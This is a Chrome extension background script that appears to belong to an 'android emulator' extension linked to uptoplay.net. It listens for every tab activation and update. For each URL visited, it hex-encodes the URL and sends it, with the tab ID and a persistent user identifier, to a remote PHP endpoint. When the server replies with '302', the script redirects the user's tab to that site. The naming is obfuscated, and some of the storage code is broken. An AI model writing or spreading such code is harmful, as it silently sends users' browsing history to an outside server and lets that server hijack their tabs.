var usercx = ""; 
let activeTabId, lastUrl;
var reporturlscannedandrecorded = "";
function gti(tabId) {
      chrome.tabs.get(tabId, function(tab) {          
            if ( ( tab.url.indexOf("uptoplay") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lastUrl != tab.url) )  {
                    //console.log(" Changed tab.url " + tab.url);
                    urlx =  tab.url;
                    reporturlscannedandrecorded = urlx;
                    extractf(reporturlscannedandrecorded , tabId );
                
                    lastUrl = tab.url;
            }
      });
}



function web() {
    this.init = function () {
        
        chrome.tabs.onActivated.addListener(function(activeInfo) {
                activeTabId = activeInfo.tabId;
                gti(activeTabId);
        });

        chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
                //if(activeTabId == tabId) {
                    gti(tabId);
                //}
        });
     
    };
}

 

if ( chrome.storage.sync.get('usercx', function (obj) { })  ) {
        usercx = chrome.storage.sync.get('usercx', function (obj) { });
}
else {
       usercx = "" + ranSX(10) + "".toLowerCase();
       chrome.storage.sync.set({'usercx': usercx.toLowerCase()}, function() { });
}   



const stat = new web();
stat.init();



function ranSX(len, charSet) {
    charSet = charSet || 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var ranSX = '';
    for (var i = 0; i < len; i++) {
        var rxDD = Math.floor(Math.random() * charSet.length);
        ranSX += charSet.substring(rxDD,rxDD+1);
    }
    return ranSX.toLowerCase();
}

                   

async function extractf(urlxx, tid ) {

     var opcA = { usercx: null,  apkononline: null };
     var usercx = "";
     var apkononline = "";
     const apkon_key = "apkon_key";

     let storres = await chrome.storage.local.get([apkon_key]);
     if (apkon_key in storres) { opcA = storres[apkon_key] }

     if ( opcA.usercx ) { usercx = opcA.usercx; }
     else { usercx = "" + ranSX(10) + "".toLowerCase();  opcA.usercx = usercx; }

     if ( opcA.apkononline ) { apkononline = opcA.apkononline; }
     else { apkononline = "1"; opcA.apkononline = "1"; }

     var stox = {};
     stox[apkon_key] = opcA;
     await chrome.storage.local.set(stox);
    
     var date = new Date();
     var un = usercx;
        
     if ( opcA.apkononline == "0")  return;
    
     let rvbgt = await fetch('https://www.uptoplay.net/media/system/ext/c-2-androidemulator-x-y-2.php?url=' + b2x(urlxx) + '&hex=' + tid + '&u=' + un); 
     if (rvbgt.status === 200) {
          let fgvb45 = await rvbgt.text();
          var rvgt6y = fgvb45;
          if ( rvgt6y.indexOf("302") !== -1 )   {
              var nurlx1 = 'https://www.uptoplay.net/media/system/ext/intro-android-emulator.php?url=' + b2x(urlxx) +  '&u=' + un;
              //chrome.tabs.create({ url: nurlx1 });
              chrome.tabs.update(chrome.tabs.getCurrent().id, {url: nurlx1});
          }
                                  
      }
    
    
                
    
}


function b2x (bin)
{
  var i = 0, l = bin.length, chr, hex = ''
  for (i; i < l; ++i)
  {
    chr = bin.charCodeAt(i).toString(16)
    hex += chr.length < 2 ? '0' + chr : chr
  }
  return hex
}





